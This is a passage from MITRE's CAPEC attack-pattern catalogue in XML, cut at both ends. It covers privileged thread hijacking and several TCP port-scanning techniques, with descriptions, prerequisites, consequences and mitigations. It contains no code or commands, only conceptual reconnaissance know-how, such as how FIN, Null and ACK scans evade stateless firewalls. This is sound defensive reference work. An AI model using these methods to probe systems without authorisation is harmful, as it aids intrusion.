               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description Summary, Payload</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="30" Name="Hijacking a Privileged Thread of Execution" Abstraction="Standard" Status="Draft">
         <Description>Adversaries can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. This can allow the adversary to access functionality the system's designer didn't intend for them to, but they may also go undetected or deny other users essential services in a catastrophic (or insidiously subtle) way.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="233"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Adversary determines the underlying system thread that is subject to user-control</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>Adversary then provides input, perhaps by way of environment variables for the process in question, that affect the executing thread</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>Upon successful hijacking, the adversary enjoys elevated privileges, and can possibly have the hijacked thread do his bidding</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users</Prerequisite>
            <Prerequisite>In order to feasibly execute this class of attacks, the adversary must have the ability to hijack a privileged thread.This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Hijacking a thread involves knowledge of how processes and threads function on the target platform, the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>
               <xhtml:p>None: No specialized resources are required to execute this type of attack. The adversary needs to be able to latch onto a privileged thread.</xhtml:p>
               <xhtml:p>The adversary does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the adversary's malicious code. This is the case even if the adversary conducts the attack remotely.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.</Mitigation>
            <Mitigation>Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Adversary targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread (e.g., a system call). The adversary could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="270"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Probing_Techniques, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, Probing_Techniques</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="300" Name="Port Scanning" Abstraction="Standard" Status="Stable">
         <Description>An adversary uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network. Although common services have assigned port numbers, services and applications can run on arbitrary ports. Additionally, port scanning is complicated by the potential for any machine to have up to 65535 possible UDP or TCP services. The goal of port scanning is often broader than identifying open ports, but also give the adversary information concerning the firewall configuration. Depending upon the method of scanning that is used, the process can be stealthy or more obtrusive, the latter being more easily detectable due to the volume of packets involved, anomalous packet traits, or system logging. Typical port scanning activity involves sending probes to a range of ports and observing the responses. There are four types of port status that this type of attack aims to identify: 1) Open Port: The port is open and a firewall does not block access to the port, 2) Closed Port: The port is closed (i.e. no service resides there) and a firewall does not block access to the port, 3) Filtered Port: A firewall or ACL rule is blocking access to the port in some manner, although the presence of a listening service on the port cannot be verified, and 4) Unfiltered Port: A firewall or ACL rule is not blocking access to the port, although the presence of a listening service on the port cannot be verified. For strategic purposes it is useful for an adversary to distinguish between an open port that is protected by a filter vs. a closed port that is not protected by a filter. Making these fine grained distinctions is impossible with certain scan types. A TCP connect scan, for instance, cannot distinguish a blocked port with an active service from a closed port that is not firewalled. Other scan types can only detect closed ports, while others cannot detect port state at all, only the presence or absence of filters. Collecting this type of information tells the adversary which ports can be attacked directly, which must be attacked with filter evasion techniques like fragmentation, source port scans, and which ports are unprotected (i.e. not firewalled) but aren't hosting a network service. An adversary often combines various techniques in order to gain a more complete picture of the firewall filtering mechanisms in place for a host.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires logical access to the target's network in order to carry out this type of attack.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary requires a network mapping/scanning tool, or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1046</Entry_ID>
               <Entry_Name>Network Service Scanning</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 54"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-158"/>
            <Reference External_Reference_ID="REF-34" Section="Section 4.1 Introduction to Port Scanning, pg. 73"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="301" Name="TCP Connect Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses full TCP connection attempts to determine if a port is open on the target system. The scanning process involves completing a 'three-way handshake' with a remote port, and reports the port as closed if the full handshake cannot be established. An advantage of TCP connect scanning is that it works against any TCP/IP stack. RFC 793 defines how TCP connections are established and torn down. TCP connect scanning commonly involves establishing a full connection, and then subsequently tearing it down, and therefore involves sending a significant number of packets to each port that is scanned. Compared to other types of scans, a TCP Connect scan is slow and methodical. This type of scanning causes considerable noise in system logs and can be spotted by IDS/IPS systems. TCP Connect scanning can detect when a port is open by completing the three-way handshake, but it cannot distinguish a port that is unfiltered with no service running on it from a port that is filtered by a firewall but contains an active service. Due to the significant volume of packets exchanged per port, TCP connect scanning can become very time consuming (performing a full TCP connect scan against a host can take multiple days). Generally, it is not used as a method for performing a comprehensive port scan, but is reserved for checking a short list of common ports.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires logical access to the target network. The TCP connect Scan requires the ability to connect to an available port and complete a 'three-way-handshake' This scanning technique does not require any special privileges in order to perform. This type of scan works against all TCP/IP stack implementations.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The adversary can leverage a network mapper or scanner, or perform this attack via routine socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Employ a robust network defense posture that includes an IDS/IPS system.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 54"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-34" Section="Section 5.3 TCP Connect Scanning, pg. 100"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="302" Name="TCP FIN Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow the adversary to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. In addition to its relative speed in comparison with other types of scans, the major advantage a TCP FIN Scan is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. FIN packets, like out-of-state ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports. FIN scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, FIN scanning a system protected by a stateful firewall may indicate all ports being open. For these reasons, FIN scanning results must always be interpreted as part of a larger scanning strategy. FIN scanning is still relatively stealthy as the packets tend to blend in with the background noise on a network link. FIN scans are detected via heuristic (non-signature) based algorithms, much in the same way as other scan types are detected.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>FIN scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>This attack pattern requires the ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 55"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-147" Section="Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, References, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">TCP FIN scan</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="303" Name="TCP Xmas Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the all flags sent in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. In addition to its relative speed when compared with other types of scans, its major advantage is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. XMAS packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing the adversary from distinguishing between open and closed ports. XMAS scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, XMAS scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, XMAS scans are flagged by almost all intrusion prevention or intrusion detection systems.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary needs logical access to the target network. XMAS scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>This attack can be carried out with a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Employ a robust network defensive posture that includes a managed IDS/IPS.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-34" Section="Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="304" Name="TCP Null Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. In addition to being fast, the major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. NULL packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason NULL scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports. NULL scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, NULL scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, NULL scans are flagged by almost all intrusion prevention or intrusion detection systems.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires logical access to the target network. NULL scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>This attack can be carried out via a network mapper/scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-34" Section="Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="305" Name="TCP ACK Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state. This type of scanning is rarely useful alone, but when combined with SYN scanning, gives a more complete picture of the type of firewall rules that are present. When a TCP ACK segment is sent to a closed port, or sent out-of-sync to a listening port, the RFC 793 expected behavior is for the device to respond with a RST. Getting RSTs back in response to a ACK scan gives the attacker useful information that can be used to infer the type of firewall present. Stateful firewalls will discard out-of-sync ACK packets, leading to no response. When this occurs the port is marked as filtered. When RSTs are received in response, the ports are marked as unfiltered, as the ACK packets solicited the expected behavior from a port. When combined with SYN techniques an attacker can gain a more complete picture of which types of packets get through to a host and thereby map out its firewall rule-set. ACK scanning, when combined with SYN scanning, also allows the adversary to analyze whether a firewall is stateful or non-stateful. If a SYN solicits a SYN/ACK or a RST and an ACK solicits a RST, the port is unfiltered by any firewall type. If a SYN solicits a SYN/ACK, but an ACK generates no response, the port is statefully filtered. When a SYN generates neither a SYN/ACK or a RST, but an ACK generates a RST, the port is statefully filtered. When neither SYN nor ACK generates any response, the port is blocked by a specific firewall rule, which can occur via any type of firewall. TCP ACK Scans are somewhat faster and more stealthy than other types of scans but often requires rather sophisticated analysis by an experienced person. A skilled adversary may use this method to map out firewall rules, but the results of ACK scanning will be less useful to a novice.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary requires logical access to the target network. ACK scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>This attack can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 55-56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-34" Section="Section 5.7 TCP ACK Scan, pg. 113"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="306" Name="TCP Window Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary engages in TCP Window scanning to analyze port status and operating system type. TCP Window scanning uses the ACK scanning method but examine the TCP Window Size field of response RST packets to make certain inferences. While TCP Window Scans are fast and relatively stealthy, they work against fewer TCP stack implementations than any other type of scan. Some operating systems return a positive TCP window size when a RST packet is sent from an open port, and a negative value when the RST originates from a closed port. TCP Window scanning is one of the most complex scan types, and its results are difficult to interpret. Window scanning alone rarely yields useful information, but when combined with other types of scanning is more useful. It is a generally more reliable means of making inference about operating system versions than port status.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>TCP Window scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 55-56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-34" Section="Section 5.8 TCP Window Scan, pg. 115"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="307" Name="TCP RPC Scan" Abstraction="Detailed" Status="Stable">
         <Description>An adversary scans for RPC services listing on a Unix/Linux host. This type of scan can be obtained via native operating system utilities or via port scanners like nmap. When performed by a scanner, an RPC datagram is sent to a list of UDP ports and the response is recorded. Particular types of responses can be indicative of well-known RPC services running on a UDP port. Direct RPC scans that bypass portmapper/sunrpc are typically slow compare to other scan types, are easily detected by IPS/IDS systems, and can only detect open ports when an RPC service responds. ICMP diagnostic message responses can help identify closed ports, however filtered and unfiltered ports cannot be identified through TCP RPC scans. There are two general approaches to RPC scanning: One is to use a native operating system utility, or script, to query the portmapper/rpcbind application running on port 111. Portmapper will return a list of registered RPC services. Alternately, one can use a port scanner or script to scan for RPC services directly. Discovering RPC services gives the attacker potential targets to attack, as some RPC services are insecure by default.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="300"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>RPC scanning requires no special privileges when it is performed via a native system utility.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
